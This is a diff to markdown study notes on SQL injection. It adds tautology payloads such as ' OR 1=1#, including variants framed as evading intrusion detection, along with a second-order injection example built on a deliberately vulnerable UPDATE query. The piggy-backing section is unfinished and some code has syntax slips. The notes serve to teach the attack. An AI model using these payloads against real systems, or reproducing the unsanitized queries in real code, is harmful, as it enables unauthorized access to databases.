@@ -78,6 +78,23 @@ Some examples of sinks include User Input (`GET`/`POST` parameters), HTTP Header
 
 ## SQLi queries
 
+### tautologies
+Common tautologies used are:
+```C
+// choosing the first available user "blindly"
+$pass ="' OR 1=1#";
+$user = "' OR user LIKE '%' #";
+$user = "' OR 1 #";
+
+//choosing a known user
+$user = "admin' OR 1#";
+$user = "admin'#";
+
+//IDS (intrusion detection system) evasion
+$pass = "'OR 5>4 OR password='mypass";
+$pass = "' OR 'vulnerability' > 'server' ";
+```
+
 ### UNION query
 the `UNION` construct can be used to achieve **data extraction**:
 
@@ -93,6 +110,27 @@ the `UNION` construct can be used to achieve **data extraction**:
 >-- 1s are placeholders for fields we don't know/care about, so we ensure compatibility with the original query's columns
 >```
 
->[!warning] the **number and type of the columns returned** by the two `SELECT` queries must **match**
+>[!warning] the **number and type of the columns returned** by the two `SELECT` queries **must match**
 >- in MySQL, if the types do not match, a cast is performed automatically
-#### SQLi tautologies
+
+### second order inject
+To perform a second order inject attack, a user with a malicious name is registered. Later on, the attacker asks to change its password, leading the DB to performing another query when retrieving the relative data.
+
+> [!example] example
+> 
+> ```SQL
+> -- malicious user 
+> $user = "admin' #";
+> 
+> -- update password query
+> $q = "UPDATE users SET pass='"$._POST['newPass']."' WHERE user='".$row['user']."'";
+> 
+> -- query if the data coming from the database is not properly sanitized
+> $q = UPDATE users SET pass='password' WHERE user='admin'#";
+> ```
+
+### piggy-backing
+```SQL
+-- query
+$q = "SELECT id FROM users WHERE user='"user."' AND pass='"
+```
